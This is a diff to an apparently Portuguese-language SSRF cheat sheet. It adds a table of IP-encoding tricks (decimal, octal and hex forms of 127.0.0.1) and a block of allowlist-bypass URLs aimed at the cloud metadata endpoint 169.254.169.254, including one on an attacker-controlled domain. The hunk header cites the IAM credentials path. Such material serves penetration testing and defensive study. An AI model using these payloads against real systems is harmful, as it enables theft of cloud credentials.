@@ -336,9 +336,18 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
 | Técnica | Exemplo | Por que fura |
 |------|----------|------------|
-| Basic / in-band | Sim | Conteúdo interno aparece na resposta |
-| Semi-blind | Parcial |código na linguagem da app → SO |
-| Blind |Não |  Interação OAST (DNS/HTTP no seu servidor) |
+| Decimal | http://2130706433/ | O parser converte; o filtro procurava "127.0.0.1" literal |
+| Octal | http://0177.0.0.1 | Outra base, mesmo IP |
+| Hex | http://0x7f000001 | Idem |
+
+Bypasses de allowlist (quando o filtro quer ver alvo.com na URL):
+
+```bash
+http://alvo.com@169.254.169.254/        # <- "alvo.com" é só o userinfo; o host real é o metadata
+http://169.254.169.254#alvo.com         # <- o "#alvo.com" é fragmento, ignorado
+http://169.254.169.254%2523@alvo.com    # double-encode pra confundir o parser
+http://alvo.com.attacker.com/           # domínio do atacante que CONTÉM "alvo.com"
+```
 
 <br>
 
